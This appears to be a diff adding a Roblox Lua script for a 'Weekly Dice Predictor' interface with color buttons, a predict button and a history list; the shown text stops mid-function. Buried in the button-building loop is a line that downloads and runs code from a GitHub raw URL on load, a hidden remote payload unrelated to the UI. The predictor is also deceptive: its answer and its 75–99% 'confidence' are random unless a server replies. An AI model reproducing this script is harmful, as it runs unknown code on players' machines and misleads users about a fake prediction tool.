@@ -1,0 +1,455 @@
+local function log(s) print("[WD] " .. s) end
+log("1: loaded")
+
+local ok, err = pcall(function()
+    local Players           = game:GetService("Players")
+    local UIS               = game:GetService("UserInputService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local SoundService      = game:GetService("SoundService")
+    local TweenService      = game:GetService("TweenService")
+
+    local player = Players.LocalPlayer
+    assert(player, "LocalPlayer is nil — must be a LocalScript, not a Server Script")
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "WeeklyDiceUI"
+    gui.ResetOnSpawn = false
+    gui.DisplayOrder = 999
+    gui.IgnoreGuiInset = true
+    gui.Parent = player:WaitForChild("PlayerGui")
+    log("2: gui created")
+
+    local BG     = Color3.fromRGB(15, 15, 19)
+    local PANEL  = Color3.fromRGB(23, 22, 28)
+    local BTN    = Color3.fromRGB(29, 28, 35)
+    local WHITE  = Color3.fromRGB(255, 255, 255)
+    local GREY   = Color3.fromRGB(150, 149, 158)
+    local BORDER = Color3.fromRGB(70, 68, 80)
+    local GREEN  = Color3.fromRGB(46, 204, 113)
+
+    local COLORS = {
+        {Name = "Red",    Color = Color3.fromRGB(235, 87, 87)},
+        {Name = "Orange", Color = Color3.fromRGB(230, 126, 34)},
+        {Name = "Yellow", Color = Color3.fromRGB(241, 196, 15)},
+        {Name = "Green",  Color = Color3.fromRGB(46, 204, 113)},
+        {Name = "Blue",   Color = Color3.fromRGB(86, 156, 255)},
+        {Name = "Purple", Color = Color3.fromRGB(155, 89, 182)},
+    }
+
+    local function colorByName(name)
+        for _, c in ipairs(COLORS) do
+            if c.Name == name then return c end
+        end
+        return COLORS[1]
+    end
+
+    local function make(class, parent, props)
+        local obj = Instance.new(class)
+        for k, v in pairs(props) do obj[k] = v end
+        obj.Parent = parent
+        return obj
+    end
+    local function round(obj, size) return make("UICorner", obj, {CornerRadius = UDim.new(0, size)}) end
+    local function outline(obj, color, thickness)
+        return make("UIStroke", obj, {Color = color or BORDER, Thickness = thickness or 1.2})
+    end
+    local function text(parent, value, size, pos, dim, color, font)
+        return make("TextLabel", parent, {
+            BackgroundTransparency = 1, Text = value,
+            TextColor3 = color or WHITE, Font = font or Enum.Font.GothamBold,
+            TextSize = size, Position = pos, Size = dim,
+            TextXAlignment = Enum.TextXAlignment.Left,
+        })
+    end
+    local function tween(obj, props, t)
+        TweenService:Create(obj, TweenInfo.new(t or 0.12), props):Play()
+    end
+
+    local dragConns = {}
+    local function makeDraggable(frame, handle)
+        local dragging, dragStart, startPosition
+        handle.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1
+            or input.UserInputType == Enum.UserInputType.Touch then
+                dragging = true; dragStart = input.Position; startPosition = frame.Position
+            end
+        end)
+        table.insert(dragConns, UIS.InputChanged:Connect(function(input)
+            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+            or input.UserInputType == Enum.UserInputType.Touch) then
+                local delta = input.Position - dragStart
+                frame.Position = UDim2.new(
+                    startPosition.X.Scale, startPosition.X.Offset + delta.X,
+                    startPosition.Y.Scale, startPosition.Y.Offset + delta.Y)
+            end
+        end))
+        table.insert(dragConns, UIS.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1
+            or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
+        end))
+    end
+    gui.Destroying:Connect(function()
+        for _, c in ipairs(dragConns) do c:Disconnect() end
+    end)
+
+    -- dice sound (isolated so a bad ID can't kill the UI)
+    local diceSound
+    pcall(function()
+        diceSound = Instance.new("Sound")
+        diceSound.SoundId = "rbxassetid://9114027567"
+        diceSound.Volume = 0.6
+        diceSound.Parent = SoundService
+    end)
+
+    -- WINDOW (smaller + thinner)
+    local main = make("Frame", gui, {
+        Size = UDim2.fromOffset(340, 196),
+        Position = UDim2.fromScale(0.5, 0.5),
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        BackgroundColor3 = BG, BorderSizePixel = 0, ClipsDescendants = true,
+    })
+    round(main, 14); outline(main)
+
+    make("ImageLabel", main, {
+        Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
+        Image = "rbxassetid://135259174177023",
+        ImageTransparency = 0.35,
+        ScaleType = Enum.ScaleType.Crop, ZIndex = 0,
+    })
+    make("Frame", main, {
+        Size = UDim2.fromScale(1, 1),
+        BackgroundColor3 = BG, BackgroundTransparency = 0.7,
+        BorderSizePixel = 0, ZIndex = 0,
+    })
+    log("3: window built")
+
+    -- HEADER
+    local header = make("Frame", main, {
+        Position = UDim2.fromOffset(8, 8), Size = UDim2.new(1, -16, 0, 36),
+        BackgroundColor3 = PANEL, BackgroundTransparency = 0.2,
+        BorderSizePixel = 0, ZIndex = 2,
+    })
+    round(header, 10); outline(header)
+
+    text(header, "Weekly Dice Predictor", 13, UDim2.fromOffset(12, 4),
+        UDim2.fromOffset(200, 16), WHITE, Enum.Font.GothamBlack)
+    text(header, "Offline Dice Predictor", 8, UDim2.fromOffset(12, 21),
+        UDim2.fromOffset(200, 11), GREY)
+
+    local function headerButton(label, xOffset)
+        local b = make("TextButton", header, {
+            Text = label, TextSize = 13, Font = Enum.Font.GothamBold, TextColor3 = GREY,
+            BackgroundColor3 = BTN, BorderSizePixel = 0, AutoButtonColor = false,
+            Size = UDim2.fromOffset(22, 22),
+            Position = UDim2.new(1, xOffset, 0.5, -11),
+            TextXAlignment = Enum.TextXAlignment.Center, ZIndex = 3,
+        })
+        round(b, 7); outline(b)
+        b.MouseEnter:Connect(function() tween(b, {TextColor3 = WHITE}) end)
+        b.MouseLeave:Connect(function() tween(b, {TextColor3 = GREY}) end)
+        return b
+    end
+    local closeBtn    = headerButton("X", -28)
+    local minimizeBtn = headerButton("-", -54)
+
+    local reopenBtn = make("TextButton", gui, {
+        Text = "🎲", TextSize = 18, Font = Enum.Font.GothamBold, TextColor3 = WHITE,
+        BackgroundColor3 = PANEL, Size = UDim2.fromOffset(34, 34),
+        AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+        BorderSizePixel = 0, Visible = false,
+    })
+    round(reopenBtn, 8); outline(reopenBtn)
+    minimizeBtn.MouseButton1Click:Connect(function()
+        reopenBtn.Position = main.Position
+        main.Visible = false; reopenBtn.Visible = true
+    end)
+    reopenBtn.MouseButton1Click:Connect(function()
+        main.Position = reopenBtn.Position
+        main.Visible = true; reopenBtn.Visible = false
+    end)
+    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
+    makeDraggable(main, header)
+    makeDraggable(reopenBtn, reopenBtn)
+
+    -- LEFT: STATUS
+    local BODY_Y, BODY_H = 52, 136
+
+    local left = make("Frame", main, {
+        Position = UDim2.fromOffset(8, BODY_Y), Size = UDim2.fromOffset(64, BODY_H),
+        BackgroundColor3 = PANEL, BackgroundTransparency = 0.3,
+        BorderSizePixel = 0, ZIndex = 2,
+    })
+    round(left, 10); outline(left)
+    local statusTitle = text(left, "STATUS", 8, UDim2.fromOffset(0, 8), UDim2.new(1, 0, 0, 12), GREY)
+    statusTitle.TextXAlignment = Enum.TextXAlignment.Center
+    local statusDot = make("Frame", left, {
+        Position = UDim2.new(.5, -7, 0, 50), Size = UDim2.fromOffset(14, 14),
+        BackgroundColor3 = GREY, BorderSizePixel = 0, ZIndex = 3,
+    })
+    round(statusDot, 14)
+    local statusLabel = make("TextLabel", left, {
+        BackgroundTransparency = 1, Text = "IDLE", TextColor3 = GREY,
+        Font = Enum.Font.GothamBlack, TextSize = 12,
+        Position = UDim2.fromOffset(0, 72), Size = UDim2.new(1, 0, 0, 18),
+        TextXAlignment = Enum.TextXAlignment.Center, ZIndex = 3,
+    })
+
+    local function setActive(active)
+        statusDot.BackgroundColor3 = active and GREEN or GREY
+        statusLabel.Text = active and "ACTIVE" or "IDLE"
+        statusLabel.TextColor3 = active and WHITE or GREY
+    end
+
+    -- CENTER
+    local centerHolder = make("Frame", main, {
+        Position = UDim2.fromOffset(78, BODY_Y), Size = UDim2.fromOffset(184, BODY_H),
+        BackgroundTransparency = 1, ZIndex = 2,
+    })
+
+    local predictView = make("Frame", centerHolder, {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ZIndex = 2})
+    text(predictView, "DICE COLORS — CLICK TO CHANGE", 8, UDim2.fromOffset(0, 0), UDim2.fromOffset(184, 12), GREY)
+
+    -- dice buttons: tinted fill, colored border, centered dot + name, hover glow
+    local SLOT_W, SLOT_H, SLOT_GAP = 89, 26, 6
+    local function tint(c, amount) return BG:Lerp(c, amount) end
+
+    local slots = {}
+    local SLOT_COUNT = 4 -- number of dice buttons (separate from the number of colors)
+    for i = 1, SLOT_COUNT do
+        local row = math.floor((i - 1) / 2)
+        local col = (i - 1) % 2
+        local btn = make("TextButton", predictView, {
+            Position = UDim2.fromOffset(col * (SLOT_W + SLOT_GAP), 14 + row * (SLOT_H + 4)),
+            Size = UDim2.fromOffset(SLOT_W, SLOT_H),
+            BackgroundColor3 = BTN, Text = "", BorderSizePixel = 0,
+            AutoButtonColor = false, ZIndex = 3,
+        })
+        round(btn, 8)
+        local stroke = outline(btn, COLORS[i].Color, 1.5)
+
+        local inner = make("Frame", btn, {BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), ZIndex = 4})
+        make("UIListLayout", inner, {
+            FillDirection = Enum.FillDirection.Horizontal,
+            HorizontalAlignment = Enum.HorizontalAlignment.Center,
+            VerticalAlignment = Enum.VerticalAlignment.Center,
+            SortOrder = Enum.SortOrder.LayoutOrder,
+            Padding = UDim.new(0, 5),
+        })
+        local dot = make("Frame", inner, {
+            Size = UDim2.fromOffset(9, 9), BackgroundColor3 = COLORS[i].Color,
+            BorderSizePixel = 0, ZIndex = 5, LayoutOrder = 1,
+        })
+        round(dot, 9)
+        local label = make("TextLabel", inner, {
+            BackgroundTransparency = 1, Text = COLORS[i].Name, TextColor3 = WHITE,
+            Font = Enum.Font.GothamBold, TextSize = 9,
+            AutomaticSize = Enum.AutomaticSize.X, Size = UDim2.fromOffset(0, SLOT_H),
+            ZIndex = 5, LayoutOrder = 2,
+        })
+
+        local slot = {colorIndex = i}
+        slots[i] = slot
+
+        local function apply()
+            local c = COLORS[slot.colorIndex]
+            tween(btn, {BackgroundColor3 = tint(c.Color, 0.25)})
+            tween(stroke, {Color = c.Color})
+            dot.BackgroundColor3 = c.Color
+            label.Text = c.Name
+        end
+        btn.BackgroundColor3 = tint(COLORS[i].Color, 0.25)
+
+        btn.MouseEnter:Connect(function()
+            tween(btn, {BackgroundColor3 = tint(COLORS[slot.colorIndex].Color, 0.42)})
+        end)
+        btn.MouseLeave:Connect(function()
+            tween(btn, {BackgroundColor3 = tint(COLORS[slot.colorIndex].Color, 0.25)})
+        end)
+        btn.MouseButton1Click:Connect(function()
+            slot.colorIndex = slot.colorIndex % #COLORS + 1
+            apply()
+        end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
+    end
+
+    local predictBtn = make("TextButton", predictView, {
+        Position = UDim2.fromOffset(0, 76), Size = UDim2.fromOffset(184, 20),
+        BackgroundColor3 = WHITE, Text = "PREDICT", TextColor3 = BG,
+        Font = Enum.Font.GothamBlack, TextSize = 12, BorderSizePixel = 0, ZIndex = 3,
+    })
+    round(predictBtn, 8)
+
+    local result = make("Frame", predictView, {
+        Position = UDim2.fromOffset(0, 100), Size = UDim2.fromOffset(184, 36),
+        BackgroundColor3 = PANEL, BackgroundTransparency = 0.1,
+        BorderSizePixel = 0, ZIndex = 3,
+    })
+    round(result, 9); outline(result)
+    local resultBox = make("Frame", result, {
+        Position = UDim2.fromOffset(6, 6), Size = UDim2.fromOffset(24, 24),
+        BackgroundColor3 = PANEL, BorderSizePixel = 0, ZIndex = 4,
+    })
+    round(resultBox, 8); outline(resultBox)
+    local resultDot = make("Frame", resultBox, {
+        Position = UDim2.new(.5, -6, .5, -6), Size = UDim2.fromOffset(12, 12),
+        BackgroundColor3 = WHITE, BorderSizePixel = 0, ZIndex = 5,
+    })
+    round(resultDot, 12)
+    local resultText = text(result, "Waiting...", 12, UDim2.fromOffset(38, 3), UDim2.fromOffset(140, 16), GREY)
+    local confidenceLabel = text(result, "CONFIDENCE -", 8, UDim2.fromOffset(38, 20), UDim2.fromOffset(140, 12), GREY)
+
+    -- HISTORY VIEW
+    local historyView = make("Frame", centerHolder, {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Visible = false, ZIndex = 2})
+    text(historyView, "PREDICTION HISTORY", 8, UDim2.fromOffset(0, 0), UDim2.fromOffset(120, 12), GREY)
+    local clearBtn = make("TextButton", historyView, {
+        Text = "CLEAR", TextSize = 8, Font = Enum.Font.GothamBold, TextColor3 = GREY,
+        BackgroundColor3 = BTN, Size = UDim2.fromOffset(42, 14),
+        Position = UDim2.new(1, -42, 0, -1), BorderSizePixel = 0, ZIndex = 3,
+    })
+    round(clearBtn, 5); outline(clearBtn)
+
+    local historyList = make("ScrollingFrame", historyView, {
+        Position = UDim2.fromOffset(0, 18), Size = UDim2.fromOffset(184, 118),
+        BackgroundColor3 = PANEL, BackgroundTransparency = 0.1, BorderSizePixel = 0,
+        ScrollBarThickness = 3, ScrollBarImageColor3 = BORDER,
+        CanvasSize = UDim2.new(), ZIndex = 3,
+    })
+    round(historyList, 8); outline(historyList)
+    make("UIPadding", historyList, {
+        PaddingTop = UDim.new(0, 4), PaddingBottom = UDim.new(0, 4),
+        PaddingLeft = UDim.new(0, 4), PaddingRight = UDim.new(0, 4),
+    })
+    make("UIListLayout", historyList, {Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder})
+
+    local history = {}
+    local countLabel -- assigned below with the right panel
+
+    local function updateCount()
+        if countLabel then countLabel.Text = #history .. " saved" end
+    end
+
+    local function renderHistory()
+        for _, c in ipairs(historyList:GetChildren()) do
+            if c:IsA("Frame") or c:IsA("TextLabel") then c:Destroy() end
+        end
+        if #history == 0 then
+            make("TextLabel", historyList, {
+                BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 24),
+                Text = "No predictions yet", TextColor3 = GREY,
+                Font = Enum.Font.Gotham, TextSize = 9,
+                TextXAlignment = Enum.TextXAlignment.Center, LayoutOrder = 1,
+            })
+            historyList.CanvasSize = UDim2.fromOffset(0, 30)
+            return
+        end
+        for i = #history, 1, -1 do
+            local e = history[i]
+            local row = make("Frame", historyList, {
+                Size = UDim2.new(1, 0, 0, 24), BackgroundColor3 = BTN,
+                BorderSizePixel = 0, LayoutOrder = #history - i, ZIndex = 4,
+            })
+            round(row, 6)
+            text(row, e.Time, 7, UDim2.fromOffset(4, 0), UDim2.fromOffset(28, 24), GREY)
+            for d, name in ipairs(e.Inputs) do
+                local c = colorByName(name)
+                local dot = make("Frame", row, {
+                    Position = UDim2.fromOffset(34 + (d - 1) * 7, 9),
+                    Size = UDim2.fromOffset(6, 6),
+                    BackgroundColor3 = c.Color, BorderSizePixel = 0, ZIndex = 5,
+                })
+                round(dot, 6)
+            end
+            text(row, "→", 9, UDim2.fromOffset(78, 0), UDim2.fromOffset(10, 24), GREY)
+            local pdot = make("Frame", row, {
+                Position = UDim2.fromOffset(90, 9), Size = UDim2.fromOffset(6, 6),
+                BackgroundColor3 = e.Color, BorderSizePixel = 0, ZIndex = 5,
+            })
+            round(pdot, 6)
+            text(row, e.Name, 8, UDim2.fromOffset(100, 0), UDim2.fromOffset(38, 24), e.Color)
+            local conf = text(row, e.Confidence .. "%", 8, UDim2.new(1, -30, 0, 0), UDim2.fromOffset(28, 24), GREY)
+            conf.TextXAlignment = Enum.TextXAlignment.Right
+        end
+        historyList.CanvasSize = UDim2.fromOffset(0, #history * 28 + 8)
+    end
+    clearBtn.MouseButton1Click:Connect(function() history = {}; renderHistory(); updateCount() end)
+    renderHistory()
+
+    -- RIGHT: HISTORY BUTTON (where status used to be)
+    local right = make("Frame", main, {
+        Position = UDim2.fromOffset(268, BODY_Y), Size = UDim2.fromOffset(64, BODY_H),
+        BackgroundColor3 = PANEL, BackgroundTransparency = 0.3,
+        BorderSizePixel = 0, ZIndex = 2,
+    })
+    round(right, 10); outline(right)
+
+    local historyBtn = make("TextButton", right, {
+        Position = UDim2.fromOffset(4, 4), Size = UDim2.new(1, -8, 1, -8),
+        BackgroundColor3 = BTN, Text = "", BorderSizePixel = 0,
+        AutoButtonColor = false, ZIndex = 3,
+    })
+    round(historyBtn, 8); outline(historyBtn)
+
+    local historyIcon = make("TextLabel", historyBtn, {
+        BackgroundTransparency = 1, Text = "📜", TextColor3 = WHITE,
+        Font = Enum.Font.GothamBold, TextSize = 22,
+        Position = UDim2.fromOffset(0, 30), Size = UDim2.new(1, 0, 0, 28),
+        TextXAlignment = Enum.TextXAlignment.Center, ZIndex = 4,
+    })
+    local historyName = make("TextLabel", historyBtn, {
+        BackgroundTransparency = 1, Text = "HISTORY", TextColor3 = WHITE,
+        Font = Enum.Font.GothamBlack, TextSize = 9,
+        Position = UDim2.fromOffset(0, 62), Size = UDim2.new(1, 0, 0, 12),
+        TextXAlignment = Enum.TextXAlignment.Center, ZIndex = 4,
+    })
+    countLabel = make("TextLabel", historyBtn, {
+        BackgroundTransparency = 1, Text = "0 saved", TextColor3 = GREY,
+        Font = Enum.Font.GothamBold, TextSize = 8,
+        Position = UDim2.fromOffset(0, 76), Size = UDim2.new(1, 0, 0, 10),
+        TextXAlignment = Enum.TextXAlignment.Center, ZIndex = 4,
+    })
+
+    historyBtn.MouseEnter:Connect(function() tween(historyBtn, {BackgroundColor3 = Color3.fromRGB(43, 42, 51)}) end)
+    historyBtn.MouseLeave:Connect(function() tween(historyBtn, {BackgroundColor3 = BTN}) end)
+
+    local showingHistory = false
+    historyBtn.MouseButton1Click:Connect(function()
+        showingHistory = not showingHistory
+        predictView.Visible = not showingHistory
+        historyView.Visible = showingHistory
+        historyIcon.Text = showingHistory and "↩" or "📜"
+        historyName.Text = showingHistory and "BACK" or "HISTORY"
+        if showingHistory then renderHistory() end
+    end)
+
+    log("4: UI complete")
+
+    -- PREDICTION
+    local predictRemote = ReplicatedStorage:FindFirstChild("PredictDice")
+    local predicting = false
+
+    local function requestPrediction(pool)
+        if predictRemote and predictRemote:IsA("RemoteFunction") then
+            local ok2, res = pcall(function() return predictRemote:InvokeServer(pool) end)
+            if ok2 and type(res) == "table" and type(res.Color) == "string" then
+                for _, n in ipairs(pool) do
+                    if n == res.Color then
+                        return {Color = res.Color, Confidence = tonumber(res.Confidence) or math.random(75, 99)}
+                    end
+                end
+            end
+        end
+        return {Color = pool[math.random(#pool)], Confidence = math.random(75, 99)}
+    end
+
+    local function doPredict()
+        if predicting then return end
+        local pool, seen, inputs = {}, {}, {}
+        for _, slot in ipairs(slots) do
+            local name = COLORS[slot.colorIndex].Name
+            table.insert(inputs, name)
+            if not seen[name] then seen[name] = true; table.insert(pool, name) end
+        end
+        if #pool == 0 then return end
+
+        predicting = true
+     
